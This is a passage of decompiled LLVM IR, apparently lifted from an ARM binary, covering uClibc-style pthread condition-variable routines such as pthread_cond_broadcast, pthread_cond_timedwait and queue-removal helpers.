  %v1_e56c = add i32 %v3_e54c, 4
  %v2_e56c = inttoptr i32 %v1_e56c to i32*
  %v3_e56c = load i32, i32* %v2_e56c, align 4
  call void @__pseudo_branch(i32 %v3_e56c)
  %v1_e570 = trunc i32 %v2_e560 to i8
  %v2_e570 = load i32, i32* @r4, align 4
  %v3_e570 = add i32 %v2_e570, 440
  %v4_e570 = inttoptr i32 %v3_e570 to i8*
  store i8 %v1_e570, i8* %v4_e570, align 1
  %v0_e574 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e578

dec_label_pc_e578:                                ; preds = %dec_label_pc_e54c, %dec_label_pc_e560
  %storemerge = phi i32 [ %v0_e574, %dec_label_pc_e560 ], [ 0, %dec_label_pc_e54c ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v0_e578 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e578, i32* %r0.global-to-local, align 4
  %v1_e57c = call i32 @__pthread_unlock(i32 %v0_e578)
  store i32 %v1_e57c, i32* %r0.global-to-local, align 4
  %v2_e580 = icmp eq i32 %storemerge, 0
  store i1 %v2_e580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e580, label %dec_label_pc_e598, label %dec_label_pc_e588

dec_label_pc_e588:                                ; preds = %dec_label_pc_e578
  %v0_e588 = load i32, i32* @r4, align 4
  store i32 %v0_e588, i32* @r0, align 4
  %v0_e58c = call i32 @__pthread_restart_new()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

dec_label_pc_e598:                                ; preds = %dec_label_pc_e578
  %v0_e59c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_e59c, i32* %r0.global-to-local, align 4
  %v0_e5a4 = call i32 @kill()
  %v0_e5a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e5a8, i32* %r0.global-to-local, align 4
  ret i32 %v0_e5a8

; uselistorder directives
  uselistorder i1 %v7_e524, { 1, 0 }
  uselistorder i32 %v3_e4f0, { 1, 0 }
  uselistorder i32 %v3_e4e4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 5, 6, 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 8 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_263c0.205 to i32), i32 8), { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e578, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %dec_label_pc_e504, { 1, 0, 2 }
}

define i32 @_enqueue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable

; uselistorder directives
  uselistorder void ()* @llvm.trap, { 1, 2, 0 }
}

define i32 @_remove_from_queue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v0_e6102 = load i32, i32* @r0, align 4
  %v1_e6103 = inttoptr i32 %v0_e6102 to i32*
  %v2_e6104 = load i32, i32* %v1_e6103, align 4
  store i32 %v2_e6104, i32* %r2.global-to-local, align 4
  %v2_e6146 = icmp eq i32 %v2_e6104, 0
  br i1 %v2_e6146, label %dec_label_pc_e61c, label %dec_label_pc_e5ec

dec_label_pc_e5ec:                                ; preds = %entry, %dec_label_pc_e60c
  %v1_e5fc = phi i32 [ %v1_e5f4, %dec_label_pc_e60c ], [ %v0_e6102, %entry ]
  %v0_e5f4 = phi i32 [ %v2_e610, %dec_label_pc_e60c ], [ %v2_e6104, %entry ]
  %v9_e5ec = icmp eq i32 %v0_e5f4, %arg1
  %v1_e5f4 = add i32 %v0_e5f4, 8
  br i1 %v9_e5ec, label %dec_label_pc_e5f4, label %dec_label_pc_e60c

dec_label_pc_e5f4:                                ; preds = %dec_label_pc_e5ec
  %v2_e5f4 = inttoptr i32 %v1_e5f4 to i32*
  %v3_e5f4 = load i32, i32* %v2_e5f4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e5fc = inttoptr i32 %v1_e5fc to i32*
  store i32 %v3_e5f4, i32* %v2_e5fc, align 4
  %v1_e604 = load i32, i32* %r2.global-to-local, align 4
  %v2_e604 = add i32 %v1_e604, 8
  %v3_e604 = inttoptr i32 %v2_e604 to i32*
  store i32 0, i32* %v3_e604, align 4
  %v0_e620.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e620

dec_label_pc_e60c:                                ; preds = %dec_label_pc_e5ec
  %v1_e610 = inttoptr i32 %v1_e5f4 to i32*
  %v2_e610 = load i32, i32* %v1_e610, align 4
  store i32 %v2_e610, i32* %r2.global-to-local, align 4
  %v2_e614 = icmp eq i32 %v2_e610, 0
  br i1 %v2_e614, label %dec_label_pc_e610.dec_label_pc_e61c_crit_edge, label %dec_label_pc_e5ec

dec_label_pc_e610.dec_label_pc_e61c_crit_edge:    ; preds = %dec_label_pc_e60c
  br label %dec_label_pc_e61c

dec_label_pc_e61c:                                ; preds = %dec_label_pc_e610.dec_label_pc_e61c_crit_edge, %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e620

dec_label_pc_e620:                                ; preds = %dec_label_pc_e5f4, %dec_label_pc_e61c
  %v0_e620 = phi i32 [ %v0_e620.pre, %dec_label_pc_e5f4 ], [ 0, %dec_label_pc_e61c ]
  ret i32 %v0_e620

; uselistorder directives
  uselistorder i32 %v2_e610, { 1, 2, 0 }
  uselistorder i32 %v1_e5f4, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_e620, { 1, 0 }
  uselistorder label %dec_label_pc_e5ec, { 1, 0 }
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_e630 = add i32 %tmp, 8
  %v3_e630 = inttoptr i32 %v2_e630 to i32*
  store i32 0, i32* %v3_e630, align 4
  %v1_e634 = load i32, i32* %r3.global-to-local, align 4
  %v2_e634 = inttoptr i32 %v1_e634 to i32*
  store i32 0, i32* %v2_e634, align 4
  %v1_e638 = load i32, i32* %r3.global-to-local, align 4
  %v2_e638 = add i32 %v1_e638, 4
  %v3_e638 = inttoptr i32 %v2_e638 to i32*
  store i32 0, i32* %v3_e638, align 4
  ret i32 0
}

define i32 @__GI_pthread_cond_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_e640 = add i32 %arg1, 8
  %v2_e640 = inttoptr i32 %v1_e640 to i32*
  %v3_e640 = load i32, i32* %v2_e640, align 4
  %v2_e644 = icmp eq i32 %v3_e640, 0
  %. = select i1 %v2_e644, i32 0, i32 16
  ret i32 %.
}

define i32 @pthread_condattr_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_condattr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_condattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_condattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %arg1.cmp = icmp ugt i32 %arg1, 1
  br i1 %arg1.cmp, label %bb, label %bb2

bb:                                               ; preds = %.thread, %bb3, %entry
  %merge = phi i32 [ 22, %entry ], [ 38, %bb3 ], [ 0, %.thread ]
  ret i32 %merge

bb2:                                              ; preds = %entry
  %v2_e67c = icmp eq i32 %arg1, 0
  br i1 %v2_e67c, label %.thread, label %bb3

bb3:                                              ; preds = %bb2
  br label %bb

.thread:                                          ; preds = %bb2
  br label %bb

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @___pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_e68c = load i32, i32* @r4, align 4
  store i32 %v3_e68c, i32* %stack_var_-12, align 4
  %v9_e68c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v2_e690 = icmp eq i32 %arg2, 0
  %v0_e694 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e694, i32* %r4.global-to-local, align 4
  br i1 %v2_e690, label %dec_label_pc_e6b0, label %dec_label_pc_e6a0

dec_label_pc_e6a0:                                ; preds = %entry
  %v1_e6a0 = add i32 %v0_e694, 64
  %v2_e6a0 = inttoptr i32 %v1_e6a0 to i8*
  %v3_e6a0 = load i8, i8* %v2_e6a0, align 1
  %v2_e6a4 = icmp eq i8 %v3_e6a0, 0
  br i1 %v2_e6a4, label %dec_label_pc_e6b8, label %bb

bb:                                               ; preds = %dec_label_pc_e6a0
  store i32 %v3_e68c, i32* @r4, align 4
  ret i32 %v0_e694

dec_label_pc_e6b0:                                ; preds = %entry
  %v1_e6b0 = add i32 %v0_e694, 28
  %v2_e6b0 = inttoptr i32 %v1_e6b0 to i32*
  %v3_e6b0 = load i32, i32* %v2_e6b0, align 4
  store i32 %v3_e6b0, i32* %r0.global-to-local, align 4
  %v2_e6b4 = call i32 @__pthread_lock(i32 %v3_e6b0, i32 %v0_e694)
  store i32 %v2_e6b4, i32* %r0.global-to-local, align 4
  %v0_e6b8.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_e6bc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e6b8

dec_label_pc_e6b8:                                ; preds = %dec_label_pc_e6a0, %dec_label_pc_e6b0
  %v1_e6bc = phi i32 [ %v0_e694, %dec_label_pc_e6a0 ], [ %v1_e6bc.pre, %dec_label_pc_e6b0 ]
  %v0_e6bc = phi i32 [ %arg2, %dec_label_pc_e6a0 ], [ %v0_e6b8.pre, %dec_label_pc_e6b0 ]
  %v2_e6b8 = icmp eq i32 %v0_e6bc, 0
  %v2_e6bc = add i32 %v1_e6bc, 444
  %v3_e6bc = inttoptr i32 %v2_e6bc to i32*
  store i32 %v0_e6bc, i32* %v3_e6bc, align 4
  br i1 %v2_e6b8, label %bb7, label %bb6

bb6:                                              ; preds = %dec_label_pc_e6b8
  %v3_e6c0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_e6c0, i32* @r4, align 4
  %v12_e6c0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v12_e6c0

bb7:                                              ; preds = %dec_label_pc_e6b8
  %v0_e6c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_e6c4 = add i32 %v0_e6c4, 28
  %v2_e6c4 = inttoptr i32 %v1_e6c4 to i32*
  %v3_e6c4 = load i32, i32* %v2_e6c4, align 4
  store i32 %v3_e6c4, i32* %r0.global-to-local, align 4
  %v2_e6c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e6c8, i32* @r4, align 4
  store i32 %v9_e68c, i32* @lr, align 4
  %v1_e6cc = call i32 @__pthread_unlock(i32 %v3_e6c4)
  store i32 %v1_e6cc, i32* %r0.global-to-local, align 4
  ret i32 %v1_e6cc

; uselistorder directives
  uselistorder i32 %v0_e694, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 6, 4, 0, 1 }
  uselistorder label %dec_label_pc_e6b8, { 1, 0 }
}

define i32 @_restart(i32 %arg1) local_unnamed_addr {
entry:
  %v0_e6d0 = call i32 @__pthread_restart_new()
  ret i32 %v0_e6d0

; uselistorder directives
  uselistorder i32 ()* @__pthread_restart_new, { 3, 1, 0, 2 }
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v2_e6e0 = call i32 @__pthread_lock(i32 %arg1, i32 0)
  %v1_e6e8 = add i32 %arg1, 8
  %v2_e6e8 = inttoptr i32 %v1_e6e8 to i32*
  %v3_e6e8 = load i32, i32* %v2_e6e8, align 4
  store i32 %v3_e6e8, i32* %r5.global-to-local, align 4
  store i32 0, i32* %v2_e6e8, align 4
  %v1_e6f4 = call i32 @__pthread_unlock(i32 %arg1)
  %v0_e71c.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_e71c2 = icmp eq i32 %v0_e71c.pr, 0
  br i1 %v2_e71c2, label %dec_label_pc_e724, label %dec_label_pc_e6fc

dec_label_pc_e6fc:                                ; preds = %entry, %dec_label_pc_e6fc
  %v2_e700 = phi i32 [ %v0_e718, %dec_label_pc_e6fc ], [ %v0_e71c.pr, %entry ]
  %v3_e700 = add i32 %v2_e700, 441
  %v4_e700 = inttoptr i32 %v3_e700 to i8*
  store i8 1, i8* %v4_e700, align 1
  %v0_e708 = load i32, i32* %r5.global-to-local, align 4
  %v1_e708 = add i32 %v0_e708, 8
  %v2_e708 = inttoptr i32 %v1_e708 to i32*
  %v3_e708 = load i32, i32* %v2_e708, align 4
  store i32 %v3_e708, i32* @r4, align 4
  store i32 0, i32* %v2_e708, align 4
  %v0_e710 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e710, i32* @r0, align 4
  %v1_e714 = call i32 @_restart(i32 %v0_e710)
  %v0_e718 = load i32, i32* @r4, align 4
  store i32 %v0_e718, i32* %r5.global-to-local, align 4
  %v2_e71c = icmp eq i32 %v0_e718, 0
  br i1 %v2_e71c, label %dec_label_pc_e724, label %dec_label_pc_e6fc

dec_label_pc_e724:                                ; preds = %dec_label_pc_e6fc, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_e718, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e6fc, { 1, 0 }
}

define i32 @_thread_self.6() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_e730 = load i32, i32* @global_var_2b16c.177, align 4
  %v0_e734 = load i32, i32* @sp, align 4
  %v3_e734 = icmp ult i32 %v0_e734, %v2_e730
  %v1_e738 = ptrtoint i32* %stack_var_0 to i32
  br i1 %v3_e734, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_e754, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2a3e0 to i32), %entry ], [ ptrtoint (i32* @global_var_2a5c0.184 to i32), %dec_label_pc_e754 ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_e748 = load i32, i32* @global_var_2b170.180, align 4
  %v3_e74c = icmp ult i32 %v0_e734, %v2_e748
  br i1 %v3_e74c, label %bb4, label %dec_label_pc_e754

dec_label_pc_e754:                                ; preds = %bb3
  %v2_e758 = load i32, i32* @global_var_2b174.182, align 4
  %v3_e75c = icmp ult i32 %v0_e734, %v2_e758
  br i1 %v3_e75c, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_e754, %bb3
  %v2_e76c = load i32, i32* @global_var_2f558.186, align 4
  %v3_e770 = and i32 %v1_e738, -2097152
  %v4_e770 = xor i32 %v3_e770, -2097152
  %v2_e778 = icmp eq i32 %v2_e76c, 0
  %v1_e77c = sub i32 -477, %v4_e770
  br i1 %v2_e778, label %dec_label_pc_e788, label %dec_label_pc_e784

dec_label_pc_e784:                                ; preds = %bb4
  %v1_e784 = call i32 @__pthread_find_self(i32 %v1_e77c)
  br label %dec_label_pc_e788

dec_label_pc_e788:                                ; preds = %bb4, %dec_label_pc_e784
  %v0_e788 = phi i32 [ %v1_e77c, %bb4 ], [ %v1_e784, %dec_label_pc_e784 ]
  %v1_e788 = add i32 %v0_e788, -3
  ret i32 %v1_e788

; uselistorder directives
  uselistorder i32 %v1_e77c, { 1, 0 }
  uselistorder label %dec_label_pc_e788, { 1, 0 }
}

define i32 @cond_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_e7b8 = call i32 @_thread_self.6()
  %v2_e7c8 = call i32 @__pthread_lock(i32 %arg1, i32 %v0_e7b8)
  %v1_e7d0 = add i32 %arg1, 8
  store i32 %v1_e7d0, i32* @r0, align 4
  %v2_e7d4 = call i32 @_remove_from_queue(i32 %v1_e7d0, i32 %arg2)
  %v1_e7e0 = call i32 @__pthread_unlock(i32 %arg1)
  ret i32 %v2_e7d4
}

define i32 @_suspend.7(i32 %arg1) local_unnamed_addr {
entry:
  %v0_e7f0 = load i32, i32* @r0, align 4
  %v1_e7f0 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_e7f0)
  ret i32 %v1_e7f0
}

define i32 @__GI_pthread_cond_timedwait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_e7f8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_e808 = call i32 @_thread_self.6()
  %v0_e80c = load i32, i32* @r6, align 4
  %v1_e80c = add i32 %v0_e80c, 12
  %v2_e80c = inttoptr i32 %v1_e80c to i32*
  %v3_e80c = load i32, i32* %v2_e80c, align 4
  %v7_e810 = icmp eq i32 %v3_e80c, 3
  br i1 %v7_e810, label %dec_label_pc_e834, label %bb

bb:                                               ; preds = %entry
  %v3_e814 = icmp eq i32 %v3_e80c, 0
  br i1 %v3_e814, label %dec_label_pc_e834, label %dec_label_pc_e820

dec_label_pc_e820:                                ; preds = %bb
  %v1_e824 = add i32 %v0_e80c, 8
  %v2_e824 = inttoptr i32 %v1_e824 to i32*
  %v3_e824 = load i32, i32* %v2_e824, align 4
  %v9_e828 = icmp eq i32 %v3_e824, %v0_e808
  br i1 %v9_e828, label %dec_label_pc_e834, label %bb30

bb30:                                             ; preds = %dec_label_pc_e820
  br label %dec_label_pc_e9e4

dec_label_pc_e834:                                ; preds = %entry, %dec_label_pc_e820, %bb
  %v0_e844 = load i32, i32* @r5, align 4
  store i32 %v0_e844, i32* %stack_var_-40, align 4
  %v3_e848 = add i32 %v0_e808, 441
  %v4_e848 = inttoptr i32 %v3_e848 to i8*
  store i8 0, i8* %v4_e848, align 1
  %v2_e854 = call i32 @___pthread_set_own_extricate_if(i32 %v0_e808, i32 %v2_e7f8)
  %v0_e858 = load i32, i32* @r5, align 4
  %v2_e860 = call i32 @__pthread_lock(i32 %v0_e858, i32 %v0_e808)
  %v1_e868 = add i32 %v0_e808, 66
  %v2_e868 = inttoptr i32 %v1_e868 to i8*
  %v3_e868 = load i8, i8* %v2_e868, align 1
  %v2_e86c = icmp eq i8 %v3_e868, 0
  br i1 %v2_e86c, label %dec_label_pc_e888, label %dec_label_pc_e874

dec_label_pc_e874:                                ; preds = %dec_label_pc_e834
  %v1_e878 = add i32 %v0_e808, 64
  %v2_e878 = inttoptr i32 %v1_e878 to i8*
  %v3_e878 = load i8, i8* %v2_e878, align 1
  %v2_e87c = icmp eq i8 %v3_e878, 0
  br i1 %v2_e87c, label %dec_label_pc_e898, label %dec_label_pc_e888

dec_label_pc_e888:                                ; preds = %dec_label_pc_e874, %dec_label_pc_e834
  %v0_e88c = load i32, i32* @r5, align 4
  %v1_e88c = add i32 %v0_e88c, 8
  %v2_e890 = call i32 @_enqueue(i32 %v1_e88c, i32 %v0_e808)
  br label %dec_label_pc_e898

dec_label_pc_e898:                                ; preds = %dec_label_pc_e874, %dec_label_pc_e888
  %storemerge19 = phi i32 [ 0, %dec_label_pc_e888 ], [ 1, %dec_label_pc_e874 ]
  store i32 %storemerge19, i32* @r4, align 4
  %v0_e898 = load i32, i32* @r5, align 4
  %v1_e89c = call i32 @__pthread_unlock(i32 %v0_e898)
  %v0_e8a0 = load i32, i32* @r4, align 4
  %v2_e8a0 = icmp eq i32 %v0_e8a0, 0
  br i1 %v2_e8a0, label %dec_label_pc_e8b8, label %dec_label_pc_e8a8

dec_label_pc_e8a8:                                ; preds = %dec_label_pc_e898
  %v2_e8b0 = call i32 @___pthread_set_own_extricate_if(i32 %v0_e808, i32 0)
  br label %dec_label_pc_e990

dec_label_pc_e8b8:                                ; preds = %dec_label_pc_e898
  %v0_e8b8 = load i32, i32* @r6, align 4
  store i32 %v0_e8b8, i32* @r0, align 4
  store i32 59592, i32* @lr, align 4
  %v1_e8c4 = call i32 @pthread_mutex_unlock()
  %v0_e8c8 = load i32, i32* @r4, align 4
  %v1_e928 = add i32 %v0_e808, 440
  %v2_e928 = inttoptr i32 %v1_e928 to i8*
  %v1_e938 = add i32 %v0_e808, 64
  %v2_e938 = inttoptr i32 %v1_e938 to i8*
  br label %dec_label_pc_e8cc

dec_label_pc_e8cc:                                ; preds = %dec_label_pc_e944, %dec_label_pc_e8b8
  %storemerge = phi i32 [ %v0_e8c8, %dec_label_pc_e8b8 ], [ %v1_e944, %dec_label_pc_e944 ]
  store i32 %storemerge, i32* @r8, align 4
  %v0_e8d0 = load i32, i32* @sl, align 4
  %v2_e8d4 = inttoptr i32 %v0_e8d0 to i32*
  %v3_e8d4 = call i32 @__pthread_timedsuspend_new(i32 %v0_e808, i32* %v2_e8d4)
  store i32 %v3_e8d4, i32* @r7, align 4
  %v2_e8d8 = icmp eq i32 %v3_e8d4, 0
  br i1 %v2_e8d8, label %dec_label_pc_e8e0, label %dec_label_pc_e914

dec_label_pc_e8e0:                                ; preds = %dec_label_pc_e8cc
  %v0_e8e4 = load i32, i32* @r5, align 4
  %v2_e8e8 = call i32 @__pthread_lock(i32 %v0_e8e4, i32 %v0_e808)
  %v0_e8ec = load i32, i32* @r5, align 4
  %v1_e8ec = add i32 %v0_e8ec, 8
  store i32 %v1_e8ec, i32* @r0, align 4
  %v2_e8f4 = call i32 @_remove_from_queue(i32 %v1_e8ec, i32 %v0_e808)
  store i32 %v2_e8f4, i32* @r4, align 4
  %v0_e8fc = load i32, i32* @r5, align 4
  %v1_e900 = call i32 @__pthread_unlock(i32 %v0_e8fc)
  %v0_e904 = load i32, i32* @r4, align 4
  %v2_e904 = icmp eq i32 %v0_e904, 0
  br i1 %v2_e904, label %dec_label_pc_e90c, label %dec_label_pc_e99c

dec_label_pc_e90c:                                ; preds = %dec_label_pc_e8e0
  store i32 %v0_e808, i32* @r0, align 4
  %v1_e910 = call i32 @_suspend.7(i32 %v0_e808)
  br label %dec_label_pc_e914

dec_label_pc_e914:                                ; preds = %dec_label_pc_e8cc, %dec_label_pc_e90c
  %v3_e918 = load i8, i8* %v4_e848, align 1
  %v2_e91c = icmp eq i8 %v3_e918, 0
  br i1 %v2_e91c, label %dec_label_pc_e924, label %dec_label_pc_e94c

dec_label_pc_e924:                                ; preds = %dec_label_pc_e914
  %v3_e928 = load i8, i8* %v2_e928, align 1
  %v2_e92c = icmp eq i8 %v3_e928, 0
  br i1 %v2_e92c, label %dec_label_pc_e944, label %dec_label_pc_e934

dec_label_pc_e934:                                ; preds = %dec_label_pc_e924
  %v3_e938 = load i8, i8* %v2_e938, align 1
  %v2_e93c = icmp eq i8 %v3_e938, 0
  br i1 %v2_e93c, label %dec_label_pc_e94c, label %dec_label_pc_e944

dec_label_pc_e944:                                ; preds = %dec_label_pc_e934, %dec_label_pc_e924
  %v0_e944 = load i32, i32* @r8, align 4
  %v1_e944 = add i32 %v0_e944, 1
  br label %dec_label_pc_e8cc

dec_label_pc_e94c:                                ; preds = %dec_label_pc_e914, %dec_label_pc_e934
  %v2_e954 = call i32 @___pthread_set_own_extricate_if(i32 %v0_e808, i32 0)
  %v3_e95c = load i8, i8* %v2_e928, align 1
  %v2_e960 = icmp eq i8 %v3_e95c, 0
  br i1 %v2_e960, label %dec_label_pc_e9c8.preheader, label %dec_label_pc_e968

dec_label_pc_e968:                                ; preds = %dec_label_pc_e94c
  %v3_e96c = load i8, i8* %v2_e938, align 1
  %v2_e970 = icmp eq i8 %v3_e96c, 0
  br i1 %v2_e970, label %dec_label_pc_e978, label %dec_label_pc_e9c8.preheader

dec_label_pc_e9c8.preheader:                      ; preds = %dec_label_pc_e94c, %dec_label_pc_e968
  %v0_e9c89 = load i32, i32* @r8, align 4
  %v1_e9c810 = add i32 %v0_e9c89, -1
  store i32 %v1_e9c810, i32* @r8, align 4
  %v2_e9c811 = icmp eq i32 %v0_e9c89, 0
  br i1 %v2_e9c811, label %dec_label_pc_e9d0, label %dec_label_pc_e9c0

dec_label_pc_e978:                                ; preds = %dec_label_pc_e968
  %v0_e97c = load i32, i32* @r6, align 4
  store i8 0, i8* %v2_e928, align 1
  store i32 59792, i32* @lr, align 4
  %v2_e98c = call i32 @pthread_mutex_lock(i32 %v0_e97c)
  br label %dec_label_pc_e990

dec_label_pc_e990:                                ; preds = %dec_label_pc_e8a8, %dec_label_pc_e978
  %v2_e998 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_e7f8)
  br label %dec_label_pc_e99c

dec_label_pc_e99c:                                ; preds = %dec_label_pc_e8e0, %dec_label_pc_e990
  %v0_e9a0 = load i32, i32* @r7, align 4
  %v2_e9a4 = call i32 @___pthread_set_own_extricate_if(i32 %v0_e808, i32 %v0_e9a0)
  %v0_e9a8 = load i32, i32* @r6, align 4
  %v2_e9b4 = call i32 @pthread_mutex_lock(i32 %v0_e9a8)
  br label %dec_label_pc_e9e4

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e9c0, %dec_label_pc_e9c8.preheader
  store i32 %v0_e808, i32* @r0, align 4
  %v1_e9c4 = call i32 @_restart(i32 %v0_e808)
  %v0_e9c8 = load i32, i32* @r8, align 4
  %v1_e9c8 = add i32 %v0_e9c8, -1
  store i32 %v1_e9c8, i32* @r8, align 4
  %v2_e9c8 = icmp eq i32 %v0_e9c8, 0
  br i1 %v2_e9c8, label %dec_label_pc_e9d0, label %dec_label_pc_e9c0

dec_label_pc_e9d0:                                ; preds = %dec_label_pc_e9c0, %dec_label_pc_e9c8.preheader
  %v0_e9d0 = load i32, i32* @r6, align 4
  %v2_e9dc = call i32 @pthread_mutex_lock(i32 %v0_e9d0)
  br label %dec_label_pc_e9e4

dec_label_pc_e9e4:                                ; preds = %bb30, %dec_label_pc_e99c, %dec_label_pc_e9d0
  %v23_e9e8 = phi i32 [ 22, %bb30 ], [ 110, %dec_label_pc_e99c ], [ 0, %dec_label_pc_e9d0 ]
  ret i32 %v23_e9e8

; uselistorder directives
  uselistorder i8* %v2_e928, { 1, 0, 2 }
  uselistorder i32 %v0_e808, { 8, 7, 17, 9, 13, 12, 14, 15, 16, 10, 11, 6, 4, 5, 3, 2, 1, 0, 18 }
  uselistorder label %dec_label_pc_e9e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e99c, { 1, 0 }
  uselistorder label %dec_label_pc_e990, { 1, 0 }
  uselistorder label %dec_label_pc_e9c8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e94c, { 1, 0 }
  uselistorder label %dec_label_pc_e914, { 1, 0 }
  uselistorder label %dec_label_pc_e898, { 1, 0 }
  uselistorder label %dec_label_pc_e834, { 1, 2, 0 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v3_e9f8 = load i32, i32* @r4, align 4
  %v6_e9f8 = load i32, i32* @r5, align 4
  %v2_e9fc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_ea08 = call i32 @_thread_self.6()
  %v0_ea0c = load i32, i32* @r6, align 4
  %v1_ea0c = add i32 %v0_ea0c, 12
  %v2_ea0c = inttoptr i32 %v1_ea0c to i32*
  %v3_ea0c = load i32, i32* %v2_ea0c, align 4
  %v7_ea10 = icmp eq i32 %v3_ea0c, 3
  br i1 %v7_ea10, label %dec_label_pc_ea34, label %bb

bb:                                               ; preds = %entry
  %v3_ea14 = icmp eq i32 %v3_ea0c, 0
  br i1 %v3_ea14, label %dec_label_pc_ea34, label %dec_label_pc_ea20

dec_label_pc_ea20:                                ; preds = %bb
  store i32 %v0_ea08, i32* @r2, align 4
  %v1_ea24 = add i32 %v0_ea0c, 8
  %v2_ea24 = inttoptr i32 %v1_ea24 to i32*
  %v3_ea24 = load i32, i32* %v2_ea24, align 4
  %v9_ea28 = icmp eq i32 %v3_ea24, %v0_ea08
  br i1 %v9_ea28, label %dec_label_pc_ea34, label %dec_label_pc_eb7c

dec_label_pc_ea34:                                ; preds = %entry, %dec_label_pc_ea20, %bb
  %v0_ea44 = load i32, i32* @r5, align 4
  store i32 %v0_ea44, i32* %stack_var_-28, align 4
  %v3_ea48 = add i32 %v0_ea08, 441
  %v4_ea48 = inttoptr i32 %v3_ea48 to i8*
  store i8 0, i8* %v4_ea48, align 1
  %v2_ea54 = call i32 @___pthread_set_own_extricate_if(i32 %v0_ea08, i32 %v2_e9fc)
  %v0_ea58 = load i32, i32* @r5, align 4
  %v2_ea60 = call i32 @__pthread_lock(i32 %v0_ea58, i32 %v0_ea08)
  %v1_ea68 = add i32 %v0_ea08, 66
  %v2_ea68 = inttoptr i32 %v1_ea68 to i8*
  %v3_ea68 = load i8, i8* %v2_ea68, align 1
  %v2_ea6c = icmp eq i8 %v3_ea68, 0
  br i1 %v2_ea6c, label %dec_label_pc_ea88, label %dec_label_pc_ea74

dec_label_pc_ea74:                                ; preds = %dec_label_pc_ea34
  %v1_ea78 = add i32 %v0_ea08, 64
  %v2_ea78 = inttoptr i32 %v1_ea78 to i8*
  %v3_ea78 = load i8, i8* %v2_ea78, align 1
